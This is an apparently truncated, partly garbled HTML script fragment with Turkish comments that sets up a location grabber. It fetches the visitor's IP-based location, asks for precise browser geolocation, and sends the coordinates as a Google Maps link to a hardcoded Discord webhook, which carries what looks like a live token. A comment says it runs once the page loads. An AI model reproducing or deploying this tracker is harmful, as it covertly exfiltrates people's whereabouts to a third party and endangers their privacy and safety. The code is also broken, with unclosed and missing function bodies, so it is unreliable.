    <script>
        // --- KONFƒ∞G√úRASYON ---
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I";

        // Discord'a veri g√∂nderen fonksiyon
        async function discordBas(mesaj) {

        function baslat() {

            fetch('https://ipapi.co/json/')

                    // 2. Hassas Konum ƒ∞ste (Kullanƒ±cƒ±ya sorar)
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                const lat = pos.coords.latitude;
                                const lng = pos.coords.longitude;
                                discordBas(`üéØ **Hassas Konum!**\nüó∫Ô∏è Harita: https://www.google.com/maps?q=${lat},${lng}`);
                            },

        // Sayfa tamamen y√ºklendiƒüinde ba≈ülat
